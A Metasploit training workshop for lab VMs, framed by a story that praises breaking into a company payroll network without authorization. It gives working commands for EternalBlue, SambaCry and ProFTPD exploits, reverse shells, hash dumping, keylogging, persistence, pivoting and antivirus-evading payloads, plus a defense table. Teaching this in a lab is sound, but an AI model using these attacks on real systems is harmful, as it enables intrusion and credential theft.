# Operation XTABAY — Metasploit: Zero to Hero
## A 45-Minute Hands-On Workshop

> *"Las herramientas no hackean. Las personas que entienden las herramientas, sí."*
> *"Tools don't hack. People who understand tools do."*
>
> — **El Pulpo**, Buenos Aires, 2012

---

## Guadalajara, March 2012

Six months had passed since the cenote operation.

**Ix_Chel** had moved on from the corporate relay job — cleaner work now, a security consulting gig she'd talked her way into with a portfolio that was mostly redacted. She was drinking coffee in a shared office near Chapultepec, laptop open, when her IRC client lit up.

*"Ix. Tenés tiempo? Encontré algo."*

El Pulpo again. Buenos Aires, always 3 AM there when he sent messages that started with *"encontré algo"*. She'd learned to take those seriously.

*"¿Qué?"*

*"Una red corporativa. Maquiladora. Nóminas. Algo no cierra."* A payroll system at a maquila assembly plant in Monterrey. Workers being underpaid on paper, the delta funneled through a management sub-entity incorporated in Delaware. El Pulpo had a whistleblower contact who'd given him a network diagram and a login that was no longer valid. He needed someone to map the attack surface properly.

*"La vez pasada usamos nc a mano,"* he typed. *"Tardamos tres horas. Esta vez hay como quince máquinas."*

Ix_Chel leaned back. Fifteen machines. Three hours with Netcat was one thing. Fifteen was a different conversation. This was a job for a framework.

She typed two words back: *"Usamos Metasploit."*

A long pause. Then:

*"Enséñame."*

That night, through a screen-shared terminal and an encrypted IRC channel, Ix_Chel taught El Pulpo the Metasploit Framework from scratch. By sunrise in Guadalajara — 11 PM in Buenos Aires — he had his first Meterpreter session.

The payroll discrepancy made it to three journalists and the labor ministry by the following week.

Nobody got hurt. Everybody got paid.

This workshop is that lesson, written down.

---

## Workshop Overview

| Item | Detail |
|---|---|
| **Duration** | 45 minutes |
| **Level** | Intermediate (comfortable with CLI and basic networking) |
| **Attacker** | ParrotOS (192.168.56.1) |
| **Targets** | Metasploitable3 — Ubuntu 14.04 (192.168.56.102) + Windows Server 2008 R2 (192.168.56.103) |
| **Goal** | First foothold on both platforms using Metasploit Framework |

> **Ethical Hacking Notice:** Every command in this workshop targets an **intentionally vulnerable lab VM**. Running these techniques against any system you do not own or have written authorization to test is illegal under CFAA, the Computer Misuse Act, and equivalent laws in your jurisdiction. Lab only.

---

## Lab Quick-Start (Before the Clock Starts)

```bash
# Ensure VMs are running and reachable
ping -c2 192.168.56.102   # Linux target
ping -c2 192.168.56.103   # Windows target

# Start MSF database and launch console
sudo service postgresql start
sudo msfdb init            # First time only
msfconsole -q

# Verify DB is connected
msf6 > db_status
# [*] Connected to msf. Connection type: postgresql.

# Create a workspace for this session
msf6 > workspace -a xtabay
msf6 > workspace
# * xtabay
```

> If VMs aren't booting: see `workshops/metasploit/setup.md` for full environment setup.

---

## Part 1 — What Is Metasploit? (5 min)

Metasploit is the industry-standard penetration testing framework. Not a single tool — a **platform** that organizes the entire attack lifecycle into reusable, searchable modules.

```
msfconsole
├── auxiliary/      Scanners, brute-forcers, fuzzers (no shell needed)
├── exploit/        The actual vulnerability trigger code
│   └── payload/    What runs on the target after exploitation
│       ├── singles     Self-contained, no callback needed
│       ├── stagers     Small stub that downloads a stage
│       └── stages      Meterpreter, shell, VNC (the meaty part)
├── post/           Post-exploitation: run inside a live session
├── encoder/        Obfuscate payloads (reduce AV signature hits)
└── nop/            NOP sleds for buffer overflow reliability
```

### The Mental Model

```
RECON          EXPLOIT          POST-EXPLOIT
  │               │                  │
db_nmap  ──►  use exploit  ──►  meterpreter session
auxiliary       set options         post/ modules
scanners        run / exploit       loot, pivot, persist
```

### Three Payload Types to Know

| Type | Example | When to Use |
|---|---|---|
| `cmd/unix/reverse_netcat` | Raw shell over nc | Quick & dirty, no MSF staging |
| `linux/x86/meterpreter/reverse_tcp` | Staged Meterpreter | Full post-exploitation capability |
| `windows/x64/meterpreter/reverse_tcp` | 64-bit Windows Meterpreter | Windows targets (prefer 64-bit) |

> **Staged vs Stageless:** `meterpreter/reverse_tcp` is *staged* — a small stager calls home, then downloads the Meterpreter stage. `meterpreter_reverse_tcp` (underscore) is *stageless* — the full payload is in the initial shellcode. Stageless works when the target can't reach back through firewalls for a second connection.

---

## Part 2 — Reconnaissance with MSF (7 min)

### 2.1 — Host Discovery

```bash
# Ping sweep — save results to MSF database automatically
msf6 > db_nmap -sn 192.168.56.0/24

# Review discovered hosts
msf6 > hosts

# Expected output includes:
# 192.168.56.102  Ubuntu 14.04
# 192.168.56.103  Windows Server 2008
```

### 2.2 — Service Enumeration (Both Targets)

```bash
# Full version scan — both targets
msf6 > db_nmap -sV -sC -p- --open 192.168.56.102 192.168.56.103

# Review the service database
msf6 > services

# Filter for specific ports
msf6 > services -p 445
msf6 > services -p 80,8080
```

### 2.3 — Targeted Auxiliary Scanners

Pick your surface. Run the scanners that match what you see:

```bash
# SMB — critical on both targets
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > setg RHOSTS 192.168.56.102 192.168.56.103
msf6 auxiliary(smb_version) > run

# Check for MS17-010 (EternalBlue) directly
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > setg RHOSTS 192.168.56.102 192.168.56.103
msf6 auxiliary(smb_ms17_010) > run

# FTP version on Linux target
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(ftp_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(ftp_version) > run
# Expected: ProFTPD 1.3.5 — vulnerable

# HTTP headers on Tomcat port
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.56.102 192.168.56.103
msf6 auxiliary(http_version) > set RPORT 8080
msf6 auxiliary(http_version) > run
```

> **`setg` vs `set`:** `setg` (set global) applies an option to every module loaded afterward. Useful for RHOSTS and LHOST when you're running many modules against the same target. Use `unsetg OPTION` to clear.

After scanning, check your intelligence:
```bash
msf6 > services     # All services found
msf6 > vulns        # Any auto-detected vulns (from -sC scripts)
msf6 > hosts -c address,os_name,os_flavor   # Host summary
```

---

## Part 3 — Initial Access: Linux Target (10 min)

**Target:** Metasploitable3 Ubuntu 14.04 — `192.168.56.102`

We'll use two paths. Pick one to execute live, review the other as reference.

---

### Path A — ProFTPd mod_copy (CVE-2015-3306)

ProFTPd 1.3.5 allows **unauthenticated** file copy operations via FTP `SITE CPFR/CPTO` commands. The exploit copies a PHP web shell into the web root, then triggers it over HTTP.

```bash
msf6 > search proftpd mod_copy
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(proftpd_modcopy_exec) > info
```

```bash
msf6 exploit(proftpd_modcopy_exec) > set RHOSTS 192.168.56.102
msf6 exploit(proftpd_modcopy_exec) > set LHOST 192.168.56.1
msf6 exploit(proftpd_modcopy_exec) > set SITEPATH /var/www/html
msf6 exploit(proftpd_modcopy_exec) > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit(proftpd_modcopy_exec) > run
```

You get a raw command shell:
```bash
# In the session
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

whoami && hostname && uname -a

# Background to MSF console
background
```

---

### Path B — SambaCry (CVE-2017-7494) — Gets Meterpreter

SambaCry uploads a malicious shared library to a writable Samba share, triggers Samba to `dlopen()` it. No authentication required on default Metasploitable3 configuration.

```bash
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(is_known_pipename) > set RHOSTS 192.168.56.102
msf6 exploit(is_known_pipename) > set LHOST 192.168.56.1
msf6 exploit(is_known_pipename) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(is_known_pipename) > check
# Should return: [+] The target is vulnerable.
msf6 exploit(is_known_pipename) > run
```

Expected output:
```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Using location \\192.168.56.102\tmp\ for the path
[*] Uploaded payload to \\192.168.56.102\tmp\XsFiRBPN.so
[+] Probe response indicates the target executed the payload!
[*] Sending stage (1017164 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened
```

First commands in your Meterpreter session:
```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps           # Running processes
meterpreter > shell        # Drop to native shell
$ id && cat /etc/passwd
$ exit                     # Return to Meterpreter
meterpreter > background   # Back to msf6 >
```

---

### Upgrade a Raw Shell to Meterpreter (No Re-Exploit)

If you landed Path A (raw shell from ProFTPd), upgrade it without touching the exploit again:

```bash
# List sessions — identify the raw shell session ID
msf6 > sessions

# Upgrade session 1 to Meterpreter
msf6 > sessions -u 1

# Or use the post module for more control
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > set LHOST 192.168.56.1
msf6 post(shell_to_meterpreter) > run
```

---

## Part 4 — Initial Access: Windows Target (10 min)

**Target:** Metasploitable3 Windows Server 2008 R2 — `192.168.56.103`

---

### MS17-010 — EternalBlue

EternalBlue exploits a critical buffer overflow in Windows SMBv1. It was developed by the NSA (leaked by Shadow Brokers in April 2017), weaponized by WannaCry, and used by NotPetya to cause $10 billion in global damage — all within months of the leak. Metasploitable3 ships with SMBv1 unpatched.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info
```

```bash
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.103
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1

# Always prefer 64-bit payload on modern Windows targets
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check first — confirm vulnerability before exploiting
msf6 exploit(ms17_010_eternalblue) > check

msf6 exploit(ms17_010_eternalblue) > run
```

Expected output:
```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.56.103:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.56.103:445 - Connecting to target for exploitation.
[+] 192.168.56.103:445 - Connection established for exploitation.
[+] 192.168.56.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.56.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-= WIN! =-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened
```

```bash
meterpreter > sysinfo
# Computer: WIN2K8-METASPLOIT
# OS: Windows 2008 R2 (Build 7601, Service Pack 1).
# Architecture: x64

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > getpid
meterpreter > ps           # List processes
```

> Getting `NT AUTHORITY\SYSTEM` means you are the highest-privilege account on a Windows system — higher than any admin account. EternalBlue delivers SYSTEM directly. No privilege escalation needed.

---

### Process Migration (Stability + Stealth)

The process running your Meterpreter is the exploit process. If it dies, you lose the session. Migrate to a stable, long-running process:

```bash
meterpreter > ps

# Find a stable process — explorer.exe, svchost.exe, lsass.exe
# Note its PID, e.g. PID 1234 = explorer.exe

meterpreter > migrate 1234

# Or auto-migrate to a suitable process
meterpreter > run post/windows/manage/migrate
```

---

### Apache Tomcat — Alternative Windows Entry

If EternalBlue is patched (or for variety), Metasploitable3 Windows also runs Tomcat 7 on port 8080 with default credentials:

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.56.103
msf6 auxiliary(tomcat_mgr_login) > set RPORT 8080
msf6 auxiliary(tomcat_mgr_login) > run
# Should find: tomcat / tomcat

msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(tomcat_mgr_upload) > set RHOSTS 192.168.56.103
msf6 exploit(tomcat_mgr_upload) > set RPORT 8080
msf6 exploit(tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_upload) > set HttpPassword tomcat
msf6 exploit(tomcat_mgr_upload) > set LHOST 192.168.56.1
msf6 exploit(tomcat_mgr_upload) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(tomcat_mgr_upload) > run
```

This deploys a malicious WAR file via the Tomcat Manager API. Classic attack path when SMB is firewalled but HTTP isn't.

---

## Part 5 — Meterpreter Essentials (5 min)

Meterpreter runs **in memory** on the target — no binary dropped to disk, no process on its own. It communicates over an encrypted channel. This is why it's the preferred post-exploitation payload.

### Universal Commands (Linux + Windows)

```bash
# System intelligence
meterpreter > sysinfo          # OS, hostname, architecture
meterpreter > getuid           # Current user context
meterpreter > getpid           # Current process ID
meterpreter > ps               # Running process list
meterpreter > env              # Environment variables

# File system
meterpreter > pwd              # Current directory
meterpreter > ls               # List directory
meterpreter > cd /tmp          # Change directory
meterpreter > download /etc/passwd /tmp/loot/  # Pull file to attacker
meterpreter > upload /tmp/tool.sh /tmp/        # Push file to target
meterpreter > search -f *.conf -d /etc         # Find files by pattern

# Networking
meterpreter > ifconfig         # Network interfaces
meterpreter > route            # Routing table
meterpreter > netstat          # Active connections

# Shell
meterpreter > shell            # Drop to native OS shell
meterpreter > execute -f /bin/bash -i   # Execute a command

# Session management
meterpreter > background       # Back to msf6 > (session stays alive)
meterpreter > exit             # Kill session and exit
```

### Windows-Only Meterpreter Commands

```bash
meterpreter > getsystem        # Attempt automatic privilege escalation
meterpreter > hashdump         # Dump NTLM password hashes (needs SYSTEM)
meterpreter > run post/windows/gather/smart_hashdump  # Safer hash dump

meterpreter > screenshot       # Capture current desktop
meterpreter > keyscan_start    # Start keylogger
meterpreter > keyscan_dump     # Dump captured keystrokes
meterpreter > keyscan_stop

meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/multi/recon/local_exploit_suggester  # Suggest privesc
```

### Linux-Only Meterpreter Commands

```bash
meterpreter > run post/linux/gather/checkvm      # Detect VM/container
meterpreter > run post/linux/gather/enum_users_history
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/multi/recon/local_exploit_suggester
```

---

## Part 6 — Post-Exploitation Basics (5 min)

### 6.1 — Credential Harvesting

**Windows — NTLM Hash Dump:**
```bash
# From SYSTEM session (EternalBlue gives you SYSTEM directly)
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
# vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

Take those hashes and crack them offline:
```bash
# In a terminal on ParrotOS (not msfconsole)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# OR
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Linux — Shadow File:**
```bash
meterpreter > download /etc/shadow /tmp/loot/shadow.txt
# Back on ParrotOS:
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/loot/shadow.txt
```

---

### 6.2 — Loot Everything (Post Modules)

MSF's `post/` modules do the heavy lifting:

```bash
# Background your session first
meterpreter > background

# Run multiple post modules against a session
msf6 > use post/multi/gather/env
msf6 post(env) > set SESSION 2
msf6 post(env) > run

# Check what you've collected
msf6 > loot
msf6 > creds
```

---

### 6.3 — Persistence (Survive a Reboot)

**Windows:**
```bash
meterpreter > run post/windows/manage/persistence_exe STARTUP=SCHEDULER LHOST=192.168.56.1 LPORT=5555
# Drops a payload and schedules it to run at login
```

**Linux (cron):**
```bash
meterpreter > run post/linux/manage/cron_persistence LHOST=192.168.56.1 LPORT=5555
```

---

### 6.4 — Pivoting to New Networks

When your target has two NICs (e.g., access to a 10.10.10.0/24 internal segment you can't reach directly), use MSF's routing:

```bash
# Add a route through your Meterpreter session (session 2)
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 2
msf6 post(autoroute) > run

# Now scan the internal network through the pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,445,3389
msf6 auxiliary(tcp) > run
# MSF tunnels this scan through your compromised host
```

For non-MSF tools (nmap, curl, sqlmap) through the pivot, add a SOCKS proxy:
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j   # Run as background job

# In a separate terminal:
proxychains nmap -sT -Pn 10.10.10.20
proxychains curl http://10.10.10.20/
```

---

## Part 7 — msfvenom in 3 Minutes

`msfvenom` is MSF's standalone payload generator. Used when you need a payload file — an `.exe`, `.elf`, `.py`, `.php` — to deliver outside of a Metasploit exploit module.

```bash
# List all payload options
msfvenom --list payloads | grep meterpreter

# Windows x64 reverse Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f exe -o payload.exe

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f elf -o payload.elf

# PHP web shell (drop on compromised web server)
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.php

# PowerShell one-liner (no file dropped)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f psh-cmd

# Encode to reduce AV signatures (shikata_ga_nai for x86)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded_payload.exe
```

After generating a payload, set up the listener before delivering it:
```bash
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.56.1
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > run -j   # Run as background job
# Now deliver your payload — when it executes, the session appears
```

---

## Quick Reference — msfconsole Command Card

```bash
# Navigation
search <term>             # Find modules by name, CVE, platform, type
use <module>              # Load a module
info                      # Module description + options
back                      # Unload module (go back to msf6 >)

# Configuration
show options              # Required and optional params
show payloads             # Compatible payloads for current exploit
set OPTION value          # Set a single option
setg OPTION value         # Set globally (all modules)
unset OPTION              # Clear an option

# Execution
check                     # Test if target is vulnerable (not all modules)
run / exploit             # Fire the module
run -j                    # Run as background job
jobs                      # List background jobs
kill <job_id>             # Kill a job

# Sessions
sessions                  # List all active sessions
sessions -i <id>          # Interact with session
sessions -u <id>          # Upgrade shell → Meterpreter
sessions -k <id>          # Kill a session
sessions -K               # Kill ALL sessions

# Database
db_status                 # Check PostgreSQL connection
db_nmap <args> <target>   # Nmap scan, save to DB
workspace -a <name>       # Create workspace
workspace <name>          # Switch workspace
hosts                     # Show all discovered hosts
services                  # Show all discovered services
services -p <port>        # Filter services by port
vulns                     # Show detected vulnerabilities
loot                      # Show collected files/data
creds                     # Show collected credentials
```

---

## Platform Comparison — Linux vs Windows

| Aspect | Linux Target | Windows Target |
|---|---|---|
| Typical entry points | FTP daemons, Samba, IRC, web apps | SMB (EternalBlue), RDP, Tomcat, IIS |
| Best payload | `linux/x86/meterpreter/reverse_tcp` | `windows/x64/meterpreter/reverse_tcp` |
| Shell from Meterpreter | `/bin/bash` | `cmd.exe` or `powershell.exe` |
| Credential dump | `/etc/shadow` download | `hashdump` (NTLM hashes) |
| Privilege escalation | SUID binaries, kernel exploits | `getsystem` → token impersonation |
| Persistence | cron, systemd, `~/.bashrc` | Registry Run keys, Scheduled Tasks |
| AV/EDR detection | Less common on lab VMs | Defender active on modern Windows |
| File paths | `/tmp`, `/var/www`, `/home` | `C:\Windows\Temp`, `C:\Users\` |
| `check` command | Works on most linux/samba modules | Works on MS17-010, most SMB modules |

---

## Session Management Patterns

```
msf6 > sessions

Active sessions
===============
  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         shell cmd/unix           uid=33(www-data) @ ubuntu            192.168.56.1 → 192.168.56.102
  2         meterpreter x86/linux    uid=root @ ubuntu                    192.168.56.1 → 192.168.56.102
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN2K8         192.168.56.1 → 192.168.56.103
```

Multiple sessions = multiple footholds. A real engagement manages them carefully:
```bash
msf6 > sessions -i 3          # Jump into Windows session
meterpreter > background       # Step back out
msf6 > sessions -i 2          # Jump into Linux session
```

---

## Detection & Defense (Purple Team)

Because Ix_Chel always thought about both sides:

| Attack | What It Looks Like to Defenders |
|---|---|
| EternalBlue | SMBv1 traffic to port 445; kernel-level shellcode execution in lsass; unusual outbound TCP on port 4444 |
| SambaCry | Library uploaded to writable SMB share; `smbd` spawning child processes |
| ProFTPd mod_copy | Unauthenticated SITE CPFR/CPTO FTP commands; new PHP files appearing in web root |
| Meterpreter staged | Single short outbound TCP → followed by large download (~1MB); TLS to non-standard port |
| hashdump | LSASS memory read; mimikatz-style process access events (Event ID 4656) |
| Persistence (registry) | HKCU\...\Run key modification (Event ID 13 in Sysmon) |
| Pivoting / autoroute | Internal subnet scanning originating from a workstation; SOCKS connections |

**Detection one-liners on the target (defensive role):**
```bash
# Linux — check for active suspicious connections
ss -tnp | grep ESTABLISHED

# Linux — find recently modified files in web root
find /var/www -mmin -60 -type f

# Windows — list unusual run keys (PowerShell)
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Windows — check for listening ports from unusual processes
netstat -bnoa | findstr LISTENING
```

---

## Lab Exercises

### Exercise 1 — Recon (5 min)
Run `db_nmap` against both targets. Use `services` to identify at least 5 distinct services. Use two auxiliary scanners. Answer: which target has more exposed attack surface?

### Exercise 2 — Linux Foothold (10 min)
Exploit ProFTPd mod_copy. Upgrade the raw shell to Meterpreter. Run `sysinfo` and `getuid`. Download `/etc/passwd`. Background the session.

### Exercise 3 — Windows Foothold (10 min)
Exploit MS17-010 EternalBlue. Confirm `NT AUTHORITY\SYSTEM`. Migrate to `explorer.exe`. Run `hashdump`. Background the session.

### Exercise 4 — Multi-Session Juggling (5 min)
You should now have sessions on both targets. Practice switching between them. Use `post/multi/recon/local_exploit_suggester` on the Linux session. Screenshot the Windows desktop with `screenshot`.

### Exercise 5 — msfvenom (5 min)
Generate a Linux ELF payload and a Windows EXE. Set up a `multi/handler` listener. Upload the ELF to the Linux target via Meterpreter and execute it — catch the callback on your handler.

### Bonus — Pivot
If your lab has a third VM on a different subnet, set up `autoroute` through your Linux session and scan the third segment. Use `socks_proxy` + `proxychains` to run `nmap` through it.

---

## Cleanup

```bash
# Kill all sessions
msf6 > sessions -K

# Kill all background jobs
msf6 > jobs -K

# Revert VM snapshots
VBoxManage snapshot "metasploitable3-ub1404" restore "clean-state"
VBoxManage snapshot "metasploitable3-win2k8" restore "clean-state"
```

Always revert before the next student session. Exploited VMs accumulate artifacts and behave unpredictably.

---

## Go Deeper — Workshop Series

This was the 45-minute overview. The full series goes much further:

| Workshop | Focus |
|---|---|
| `workshops/metasploit/bronze-linux.md` | Three Linux exploits in depth: ProFTPd, SambaCry, UnrealIRCd |
| `workshops/metasploit/bronze-windows.md` | EternalBlue + ManageEngine — detailed Windows recon + exploitation |
| `workshops/metasploit/silver-windows.md` | Privilege escalation, credential harvesting, Pass-the-Hash, lateral movement |
| `workshops/metasploit/gold-windows.md` | Custom payloads, SOCKS pivoting, resource scripts, DCSync, full chain |

---

## Final Thought

Ix_Chel closed her terminal at 6:30 AM Guadalajara time, sun starting to warm the concrete outside.

El Pulpo had his session. He'd run `sysinfo` three times just to watch it work, grinning at each output like he'd discovered fire. She understood the feeling — everyone has it their first time. That moment where abstract vulnerability descriptions become concrete, interactive, real. A session prompt where there wasn't one. A system you're talking to that doesn't know who you are.

*"¿Esto es Metasploit?"* he'd typed at some point around 3 AM Buenos Aires time.

*"Esto es Metasploit."*

*"Es como hablar con las máquinas."*

She'd smiled at that. He wasn't wrong. The framework is a language. Learn its grammar — modules, options, payloads, sessions — and you can have a conversation with almost any machine on a network. That's not magic. That's craft. That's what they don't teach in the vendor certifications and the YouTube tutorials. The feeling of understanding *why* a vulnerability works, *what* the payload is actually doing, *how* the session persists.

Netcat was the first word. Metasploit is the first sentence.

The rest of the language is out there. Go learn it.

**DEFCON vibes. Gray hat. Purple team. Exploit responsibly.**

---

